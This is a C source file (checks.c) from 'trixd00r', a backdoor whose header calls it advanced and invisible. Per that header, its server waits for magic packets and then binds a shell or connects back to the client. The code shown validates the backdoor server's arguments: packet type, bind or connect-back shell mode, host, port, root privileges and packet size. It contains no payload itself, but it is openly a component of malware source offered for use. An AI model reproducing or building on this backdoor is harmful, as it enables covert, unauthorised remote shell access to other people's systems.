/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/checks.c                                                         *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "checks.h"
#include "shell.h"
#include "wrapper.h"
#include "error.h"


/* checks for valid packet type / prints out available types */
void check_pkt_type(ctrl_t *ctrl, char *type)
{
    /* list packet types */
    if (strchr(type, '?')) {
        print_packet_types();
        free_trixd00rd(ctrl);
        __EXIT_SUCCESS;
    }

    /* wrong packet type */
    if (ATOI(type) < 0 || ATOI(type) >= _NUM_PKT_TYPES) {
        free_trixd00rd(ctrl);
        print_error(ERR_PKT_TYPE);
    }

    return;
}


/* checks for valid shell mode / prints out available modes */
void check_shell_mode(ctrl_t *ctrl, char *mode)
{
    /* list shell modes */
    if (strchr(mode, '?')) {
        print_shell_modes();
        free_trixd00rd(ctrl);
        __EXIT_SUCCESS;
    }

    /* wrong shell mode */
    if (ATOI(mode) < 0 || ATOI(mode) >= _NUM_SHELL_MODES) {
        free_trixd00rd(ctrl);
        print_error(ERR_SHELL_MODE);
    }

    return;
}


/* checks for valid hosts */
void check_host(const char *host)
{
    int x = 0;
    unsigned char buff[sizeof(struct in_addr)];


    x = inet_pton(AF_INET, host, buff);

    if (x <= 0) {
        xgethostbyname(host);
    }

    return;
}


/* checks for valid port number */
void check_port(ctrl_t *ctrl, int port)
{
    if (port == 0 || port < 0 || port > 65535) {
        free_trixd00rd(ctrl);
        print_error(ERR_PORT);
    }

    return;
}


/* checks for uid 0 */
void check_uid(ctrl_t *ctrl)
{
    uid_t uid = 0;


    uid = getuid();
    
    if (uid != 0) {
        free_trixd00rd(ctrl);
        print_error(ERR_UID);
    }

    return;
}


/* checks for packet size */
void check_pkt_size(ctrl_t *ctrl, int size)
{
    if (size > MAX_PORT) {
        free_trixd00rd(ctrl);
        print_error(ERR_PKT_SIZE);
    }

    return;
}


/* check first usage */
void check_argc(int argc)
{
    if (argc < 2) {
        print_error(ERR_ARGC);
    }

    return;
}


/* checks, if necessary arguments are selected */
void check_args(ctrl_t *ctrl)
{
    /* interface was not selected */
    if (ctrl->sniffer->iface == NULL) {
        free_trixd00rd(ctrl);
        print_error(ERR_ARGS);
    }

    /* other needed arguments were not defined */
    if (ctrl->sniffer->iface == NULL ||
        (ctrl->shell->mode == _TCP_CONN_BACK &&
         ctrl->shell->host == NULL) ||
        (ctrl->shell->mode == _UDP_CONN_BACK &&
         ctrl->shell->host == NULL)) {
        free_trixd00rd(ctrl);
        print_error(ERR_ARGS);
    }

    return;
}

/* EOF */
